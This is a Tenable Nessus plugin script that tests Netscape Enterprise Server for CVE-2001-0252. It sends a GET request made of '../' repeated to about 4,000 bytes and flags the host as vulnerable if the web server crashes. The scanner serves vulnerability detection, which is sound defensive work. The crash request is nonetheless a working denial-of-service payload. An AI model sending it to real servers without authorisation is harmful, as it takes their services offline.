#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10689);
  script_version ("$Revision: 1.24 $");
  script_cve_id("CVE-2001-0252");
  script_bugtraq_id(2282);
  script_osvdb_id(1739);

  script_name(english:"Netscape Enterprise Server Long Traversal Request Remote DoS");
  script_summary(english:"Attempt to crash the service by sending a long traversal string.");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote server is vulnerable to a denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote web server seems to crash when it is issued a too long
request with dots (ie: ../../../../ 1000 times).

An attacker may use this flaw to disable the remote server."
  );

  script_set_attribute(
    attribute:'solution',
    value: "http://www.iplanet.com/support/iws-alert/index.html"
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(
    attribute:'see_also',
    value:'http://marc.info/?l=bugtraq&m=98035833331446&w=2'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/06/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/01/22");
 script_cvs_date("$Date: 2016/11/23 20:31:33 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:netscape:enterprise_server");
  script_end_attributes();


  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/iplanet");
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (http_is_dead(port:port))exit(0);

banner = get_http_banner(port:port);
if (! banner) exit(1, "No HTTP banner on port "+port);
if ("Netscape-Enterprise/" >!< banner ) exit(0, "the web server on port "+port+" is not Netscape-Enterprise");


w = http_send_recv3(method:"GET", port: port, 
  item:crap(data:"../", length:4032));

if (http_is_dead(port:port))security_warning(port);
